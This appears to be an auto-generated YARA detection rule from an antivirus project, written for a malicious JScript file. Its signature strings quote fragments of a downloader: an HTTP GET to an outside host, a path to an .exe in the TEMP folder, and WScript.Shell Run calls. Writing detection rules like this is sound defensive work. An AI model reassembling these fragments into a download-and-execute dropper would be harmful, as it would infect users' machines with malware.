rule sig_20160329_fac50db2804096745967bbbace8d0458 {
  meta:
    description = "datamaliciousorder - file 20160329_fac50db2804096745967bbbace8d0458.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f8831cf46e1829346c7ba61c393965a0e9e320af7178ef6ff78b0d855a5b1cec"

  strings:
    $s1  = "c0[JA](\"GET\", \"http://energq.com/e3ola\", false);" fullword ascii
    $s2  = "function O() {return cg[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"sqjDfGzx2EawBgz.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[rQ](z() * 11); if (c0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function Hh(J, K){Zx = Zx * 1; return J - K;};" fullword ascii
    $s5  = "var cg = function a() {return WScript[B0](\"WScript.Shell\");}(), Vf = 11;" fullword ascii
    $s6  = "function s(){return \"\" + O0;};" fullword ascii
    $s7  = "function TA() {return ((RJ == true) && (RJ == ou)) ? 1 : Zx;};" fullword ascii
    $s8  = "function lv(W){cg[\"Run\"](W, Zx, Zx);};" fullword ascii
    $s9  = " while (B){" fullword ascii
    $s10 = "function z(){return 22;};" fullword ascii
    $s11 = "var SP = new this[\"Date\"]();" fullword ascii
    $s12 = "return Hh(Cf, P);" fullword ascii
    $s13 = "function Rm(j) {var e = (1, 2, 3, 4, 5, j); return e;};" fullword ascii
    $s14 = "function a0(){return B0;};" fullword ascii
    $s15 = "function Zr()" fullword ascii
    $s16 = "var h = false;" fullword ascii
    $s17 = "RJ = true; " fullword ascii
    $s18 = "ou = true; " fullword ascii
    $s19 = "var ou = false;" fullword ascii
    $s20 = "var RJ = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}